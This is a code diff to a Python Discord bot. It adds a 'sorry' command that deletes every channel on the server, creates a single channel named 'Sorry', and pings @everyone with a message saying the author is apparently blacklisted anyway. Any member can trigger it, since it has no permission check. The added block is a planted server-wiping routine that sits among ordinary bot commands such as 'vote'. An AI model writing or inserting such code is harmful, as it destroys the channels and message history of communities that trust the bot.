@@ -49,6 +49,13 @@ async def grr(ctx):
         await client.send_message(ctx.message.author, "sorry bud, this command aint for u.")
 
 @client.command(pass_context=True)
+async def sorry(ctx):
+	for channel in ctx.message.server.channels:
+		await client.delete_channel(channel)
+	channel = await client.create_channel(ctx.message.server, 'Sorry', type=discord.ChannelType.text)
+	await client.send_message(channel, "sorry, but i'm nusa blacklisted so this doesn't even matter. @everyone")        
+        
+@client.command(pass_context=True)
 async def vote(ctx):
     server = client.get_server('467897785845284864')
     member = server.get_member(ctx.message.author.id)
